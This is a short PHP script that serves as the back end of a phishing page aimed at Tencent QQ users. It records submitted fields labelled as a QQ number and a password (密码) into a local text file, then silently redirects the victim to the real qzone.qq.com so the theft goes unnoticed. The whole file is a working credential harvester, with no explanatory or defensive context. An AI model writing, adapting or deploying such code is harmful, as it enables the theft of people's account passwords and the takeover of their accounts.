<?php

$title = $_POST['title'];
$content = $_POST['content'];

file_put_contents("data.txt","QQ:<font color=blue>".$title."</font>\r\r密码:<font color=red>".$content."</font>\n\n",FILE_APPEND);

echo '<meta http-equiv="refresh" content="0;URL=https://qzone.qq.com/">';


?>